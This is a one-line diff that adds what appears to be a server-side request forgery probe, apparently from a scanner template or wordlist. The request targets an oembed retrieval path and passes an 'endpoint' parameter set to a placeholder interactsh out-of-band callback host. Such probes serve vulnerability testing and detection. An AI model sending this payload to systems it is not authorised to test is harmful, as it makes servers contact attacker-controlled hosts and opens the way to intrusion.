@@ -1,0 +1,1 @@
+/external_content/retrieve/oembed?endpoint=http://{{interactsh-url}}&url=foo
